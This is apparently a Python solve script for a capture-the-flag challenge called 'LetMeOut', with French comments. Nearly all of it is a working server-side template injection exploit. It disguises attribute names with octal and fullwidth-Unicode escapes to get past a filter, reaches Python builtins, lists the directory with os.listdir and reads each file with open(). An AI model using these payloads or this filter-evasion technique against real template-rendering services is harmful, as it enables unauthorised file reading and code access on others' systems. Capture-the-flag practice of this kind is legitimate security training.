# LetMeOut — hiCTF (script de solve)
import ssl,socket,time,re,sys
HOST="letmeout-e634de223eb3.chall.hiddeninvestigations.net";PORT=1337
B=chr(92)
class Conn:
    def __init__(s,to=12):
        ctx=ssl._create_unverified_context()
        s.s=ctx.wrap_socket(socket.create_connection((HOST,PORT),timeout=to),server_hostname=HOST)
        s.s.settimeout(to); s._p()
    def _p(s):
        buf=b""
        try:
            while b"> " not in buf[-3:]:
                d=s.s.recv(8192); 
                if not d:break
                buf+=d
        except:pass
        return buf
    def line(s,ln):
        s.s.sendall(ln.encode()+b"\n"); time.sleep(0.12); buf=b""
        try:
            while True:
                d=s.s.recv(8192)
                if not d:break
                buf+=d
                if b"> " in buf[-3:]:break
        except:pass
        return buf.replace(b"> ",b"").strip()
    def close(s):
        try:s.s.close()
        except:pass

def mk(RICH):
    BUD=set(RICH)
    def oc(b): return B+("%o"%b if b<0o100 else "%03o"%b)
    def enc(ch,first=False):
        if first: return B+"uff3f" if ch=="_" else B+"u%04x"%(0xff00+ord(ch)-0x20)
        if not ch.isalpha(): return oc(ord(ch)) if ch in ('"',B) else ch
        return ch if ch in BUD else oc(ord(ch))
    def A(n): return '"'+enc(n[0],True)+''.join(enc(c) for c in n[1:])+'"|'+RICH
    def K(n): return '"'+''.join(enc(c) for c in n)+'"'
    BAS='(9|'+RICH+')['+A("__str__")+']['+A("__builtins__")+']'
    return A,K,BAS

names=["buff","cuff","duff","guff","huff","luff","muff","puff","ruff","tuff"]
con=Conn()
present=[n for n in names if con.line("{{9|"+n+"}}")==b"9"]
print("[*] filtres présents:",present)
RICH=None
for f in present:
    A,K,BAS=mk(f)
    probe='{{'+BAS+'['+K("__name__")+']}}'   # builtins dict has __name__='builtins'
    r=con.line(probe)
    print("   test rich=%s -> %r (len %d)"%(f,r[:40],len(probe)))
    if b"builtins" in r: RICH=f; break
if not RICH:
    print("[!] aucun filtre rich exploitable cette connexion, reconnecte"); con.close(); sys.exit(2)
print("[+] filtre rich =",RICH)
A,K,BAS=mk(RICH)
# LIST current dir (/flags)
LST='{{'+BAS+'['+K("__import__")+']('+K("os")+')['+K("listdir")+']('+K(".")+')}}'
print("[*] LIST len",len(LST))
r=con.line(LST).decode('latin1')
print("[*] /flags =>",r)
fnames=re.findall(r"'([^']+)'", r)
print("[*] fichiers:",fnames)
for nm in fnames:
    RD='{{'+BAS+'['+K("open")+']('+K(nm)+')['+K("read")+']()}}'
    if len(RD)>170:
        print("  [!] %s payload trop long (%d)"%(nm,len(RD))); continue
    out=con.line(RD).decode('latin1')
    print("  %s (len %d) => %r"%(nm,len(RD),out))
con.close()
